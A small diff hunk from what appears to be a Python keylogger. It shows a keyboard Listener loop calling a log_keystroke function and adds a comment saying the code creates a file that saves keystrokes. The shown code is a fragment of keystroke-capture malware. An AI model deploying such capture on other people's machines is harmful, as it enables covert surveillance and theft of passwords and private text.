@@ -8,3 +8,4 @@ def log_keystroke(key):
 
 with Listener(on_press=log_keystroke) as listener:
     listener.join()
+#after writing this code this will creat a new file for saving keystrocks of keyboard
